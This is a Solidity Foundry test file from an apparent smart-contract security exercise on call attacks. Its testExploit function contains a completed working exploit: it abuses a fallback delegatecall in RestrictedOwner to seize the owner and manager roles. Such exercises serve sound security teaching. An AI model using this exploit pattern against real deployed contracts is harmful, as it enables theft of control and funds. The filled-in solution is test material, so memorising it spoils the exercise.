// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/18. Call Attacks-1/UnrestrictedOwner.sol";
import "../../src/18. Call Attacks-1/RestrictedOwner.sol";

contract TestCA1 is Test {
    UnrestrictedOwner uOwner;
    RestrictedOwner rOwner;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */
        // Deploy
        vm.startPrank(deployer);
        uOwner = new UnrestrictedOwner();

        rOwner = new RestrictedOwner(address(uOwner));

        vm.stopPrank();

        // Any user can take ownership on `UnrestrictedOwner` contract
        vm.prank(user);
        uOwner.changeOwner(address(user));
        assertEq(uOwner.owner(), address(user));

        // Any user can't take ownership on `RestrictedOwner` contract
        vm.prank(user);
        vm.expectRevert();
        rOwner.updateSettings(address(user), address(user));

        assertEq(rOwner.owner(), address(deployer));
        assertEq(rOwner.manager(), address(deployer));
    }

    function testExploit() public {
        /**
         * CODE YOUR SOLUTION HERE
         */

        // We want to trigger the fallback function in the Restricted.sol contract
        // We want to execute the delegateCall to the "changeOwner(address _newOwner)" function
        // We want to send _newOwner = attacker's address
        // Call the UpdateSettings function to update the manager
        vm.startPrank(attacker);
        uOwner.changeOwner(address(attacker));
        (bool success,) = address(rOwner).call(abi.encodeWithSignature("changeOwner(address)", attacker));
        require(success, "Call Failed");

        rOwner.updateSettings(attacker, attacker);

        /**
         * SUCCESS CONDITIONS
         */
        assertEq(rOwner.owner(), address(attacker));
        assertEq(rOwner.manager(), address(attacker));
    }
}
